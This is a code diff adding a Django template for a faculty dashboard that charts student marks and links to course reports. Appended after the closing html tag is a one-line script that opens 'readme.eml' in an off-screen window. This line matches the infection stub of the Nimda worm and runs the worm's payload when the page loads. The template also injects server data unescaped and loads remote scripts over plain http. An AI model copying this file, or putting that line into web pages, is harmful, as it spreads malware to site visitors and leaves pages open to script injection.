@@ -1,0 +1,384 @@
+{% load staticfiles %}	
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Faculty Dashboard</title>
+
+    <link rel="stylesheet" type="text/css" href="{% static "bootstrap/css/bootstrap.min.css" %}" />
+    <link rel="stylesheet" type="text/css" href="{% static "font-awesome/css/font-awesome.min.css" %}" />
+    <link rel="stylesheet" type="text/css" href="{% static "css/local.css" %}" />
+
+    <script type="text/javascript" src="{% static "js/jquery-1.10.2.min.js" %}"></script>
+    <script type="text/javascript" src="{% static "bootstrap/js/bootstrap.min.js"%}"></script>
+
+    <!-- you need to include the shieldui css and js assets in order for the charts to work -->
+   
+    <script type="text/javascript" src="http://www.shieldui.com/shared/components/latest/js/shieldui-all.min.js"></script>
+    <script type="text/javascript" src="http://www.prepbootstrap.com/Content/js/gridData.js"></script>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
+<script src="http://code.highcharts.com/highcharts.js"></script>
+<script type="text/javascript">
+var marks=[];
+var xaxis=[];
+var d ={{data|safe}};
+var j=0;
+for (var i in d)
+{
+    xaxis[i]=d[i][0]+d[i][1];
+    marks[i]=d[i][2]*100;
+}
+
+$(function () {
+    $('#student_grade').highcharts({
+        chart: {
+            type: 'column',
+            backgroundColor : "#232123"
+        },
+        title: {
+            text: 'Student Marks'
+        },
+        xAxis: {
+            categories: xaxis,
+            crosshair: true
+        },
+        yAxis: {
+            min: 0,
+	    max: 100,
+            title: {
+                text: 'Marks (%)'
+            }
+        },
+        plotOptions: {
+            column: {
+                pointPadding: 0.2,
+                borderWidth: 0
+            },
+            bar: {
+                dataLabels: {
+                    enabled: true
+                }
+            }
+        },
+         tooltip: {
+            valueSuffix: '%',
+            valueDecimals: 2
+        },
+        series: [{
+            name: 'Marks (%)',
+            data: marks
+
+        }]
+    });
+});
+
+
+// Load the fonts
+Highcharts.createElement('link', {
+   href: '//fonts.googleapis.com/css?family=Unica+One',
+   rel: 'stylesheet',
+   type: 'text/css'
+}, null, document.getElementsByTagName('head')[0]);
+
+Highcharts.theme = {
+   colors: ["#2b908f", "#90ee7e", "#f45b5b", "#7798BF", "#aaeeee", "#ff0066", "#eeaaee",
+      "#55BF3B", "#DF5353", "#7798BF", "#aaeeee"],
+   chart: {
+      backgroundColor: {
+         linearGradient: { x1: 0, y1: 0, x2: 1, y2: 1 },
+         stops: [
+            [0, '#2a2a2b'],
+            [1, '#3e3e40']
+         ]
+      },
+      style: {
+         fontFamily: "'Unica One', sans-serif"
+      },
+      plotBorderColor: '#606063'
+   },
+   title: {
+      style: {
+         color: '#E0E0E3',
+         textTransform: 'uppercase',
+         fontSize: '20px'
+      }
+   },
+   subtitle: {
+      style: {
+         color: '#E0E0E3',
+         textTransform: 'uppercase'
+      }
+   },
+   xAxis: {
+      gridLineColor: '#707073',
+      labels: {
+         style: {
+            color: '#E0E0E3'
+         }
+      },
+      lineColor: '#707073',
+      minorGridLineColor: '#505053',
+      tickColor: '#707073',
+      title: {
+         style: {
+            color: '#A0A0A3'
+
+         }
+      }
+   },
+   yAxis: {
+      gridLineColor: '#707073',
+      labels: {
+         style: {
+            color: '#E0E0E3'
+         }
+      },
+      lineColor: '#707073',
+      minorGridLineColor: '#505053',
+      tickColor: '#707073',
+      tickWidth: 1,
+      title: {
+         style: {
+            color: '#A0A0A3'
+         }
+      }
+   },
+   tooltip: {
+      backgroundColor: 'rgba(0, 0, 0, 0.85)',
+      style: {
+         color: '#F0F0F0'
+      }
+   },
+   plotOptions: {
+      series: {
+         dataLabels: {
+            color: '#B0B0B3'
+         },
+         marker: {
+            lineColor: '#333'
+         }
+      },
+      boxplot: {
+         fillColor: '#505053'
+      },
+      candlestick: {
+         lineColor: 'white'
+      },
+      errorbar: {
+         color: 'white'
+      }
+   },
+   legend: {
+      itemStyle: {
+         color: '#E0E0E3'
+      },
+      itemHoverStyle: {
+         color: '#FFF'
+      },
+      itemHiddenStyle: {
+         color: '#606063'
+      }
+   },
+   credits: {
+      style: {
+         color: '#666'
+      }
+   },
+   labels: {
+      style: {
+         color: '#707073'
+      }
+   },
+
+   drilldown: {
+      activeAxisLabelStyle: {
+         color: '#F0F0F3'
+      },
+      activeDataLabelStyle: {
+         color: '#F0F0F3'
+      }
+   },
+
+   navigation: {
+      buttonOptions: {
+         symbolStroke: '#DDDDDD',
+         theme: {
+            fill: '#505053'
+         }
+      }
+   },
+
+   // scroll charts
+   rangeSelector: {
+      buttonTheme: {
+         fill: '#505053',
+         stroke: '#000000',
+         style: {
+            color: '#CCC'
+         },
+         states: {
+            hover: {
+               fill: '#707073',
+               stroke: '#000000',
+               style: {
+                  color: 'white'
+               }
+            },
+            select: {
+               fill: '#000003',
+               stroke: '#000000',
+               style: {
+                  color: 'white'
+               }
+            }
+         }
+      },
+      inputBoxBorderColor: '#505053',
+      inputStyle: {
+         backgroundColor: '#333',
+         color: 'silver'
+      },
+      labelStyle: {
+         color: 'silver'
+      }
+   },
+
+   navigator: {
+      handles: {
+         backgroundColor: '#666',
+         borderColor: '#AAA'
+      },
+      outlineColor: '#CCC',
+      maskFill: 'rgba(255,255,255,0.1)',
+      series: {
+         color: '#7798BF',
+         lineColor: '#A6C7ED'
+      },
+      xAxis: {
+         gridLineColor: '#505053'
+      }
+   },
+
+   scrollbar: {
+      barBackgroundColor: '#808083',
+      barBorderColor: '#808083',
+      buttonArrowColor: '#CCC',
+      buttonBackgroundColor: '#606063',
+      buttonBorderColor: '#606063',
+      rifleColor: '#FFF',
+      trackBackgroundColor: '#404043',
+      trackBorderColor: '#404043'
+   },
+
+   // special colors for some of the
+   legendBackgroundColor: 'rgba(0, 0, 0, 0.5)',
+   background2: '#505053',
+   dataLabelsColor: '#B0B0B3',
+   textColor: '#C0C0C0',
+   contrastTextColor: '#F0F0F3',
+   maskColor: 'rgba(255,255,255,0.3)'
+};
+
+// Apply the theme
+Highcharts.setOptions(Highcharts.theme);
+</script>
+
+<script>
+var xdata=[];
+var ydata=[];
+var data={{data2|safe }};
+for (var prop in data) {
+        //alert("Key:" + data[prop].course_id);
+		xdata[prop]=data[prop].course_id;
+        //alert("Value:" + data[prop].no_of_students);
+		ydata[prop]=data[prop].no_of_students;
+			}
+
+</script>
+
+</head>
+<body>
+
+    <div id="wrapper">
+
+          <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="">Faculty Panel</a>
+            </div>
+
+            <div class="collapse navbar-collapse navbar-ex1-collapse">
+                <ul id="active" class="nav navbar-nav side-nav">
+                    <li class="selected"><a href="{% url 'index' facultyid=fid %}"><i class="fa fa-globe"></i> Dashboard</a></li>
+                                        <li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown">
+                     <i class="fa fa-tasks"></i> Course Enrollment Report<span class="caret"></span></a>
+				<ul class="dropdown-menu">
+					<li><a href="{% url 'stuofcrs' facultyid=fid %}">List of Students per course</a></li></ul></li>
+                   <li class = "dropdown"><a class="dropdown-toggle" data-toggle = "dropdown">
+                    <i class="fa fa-list-ol"></i> Grading Reports <span class="caret"></span></a>
+				<ul class="dropdown-menu">
+					<li><a href="">List of Students' Grades</a></li></ul></li>
+                   
+                   
+             	     <li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown">
+		     <i class="fa fa-font"></i> Discussion Activity Report <span class="caret"></span></a>
+				<ul class="dropdown-menu">
+					<li><a href="{% url 'course_unanswered_questions' facultyid=fid %}">List of Unanswered Questions</a></li>
+					<li><a href="{% url 'course_discussions' facultyid=fid %}">List of Discussions</a></li>
+					<li><a href="{% url 'course_answered_questions' facultyid=fid %}">List of Answered Questions</a></li>
+				</ul>
+		     </li>
+                </ul>
+
+                <ul class="nav navbar-nav navbar-right navbar-user">
+                  
+                    <li class="dropdown user-dropdown">
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-user"></i> {{ request.session.username }} <b class="caret"></b></a>
+                        <ul class="dropdown-menu">
+                            <li><a href="#"><i class="fa fa-user"></i> Profile</a></li>
+                            <li><a href="#"><i class="fa fa-gear"></i> Settings</a></li>
+                            <li class="divider"></li>
+                            <li><a href="{% url 'getout' %}"><i class="fa fa-power-off"></i> Log Out</a></li>
+
+                        </ul>
+                    </li>
+                    <li class="divider-vertical"></li>
+               
+                </ul>
+            </div>
+        </nav>
+
+        <div id="page-wrapper">
+	
+       
+       <div class="row">
+
+                <div class="col-md-12" >
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            <h3 class="panel-title"><i class="fa fa-bar-chart-o"></i> Students' Grades</h3>
+                        </div>
+                        <div class="panel-body">
+                            <div id="student_grade"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+       
+	        
+
+    </div>
+  
+   
+</body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
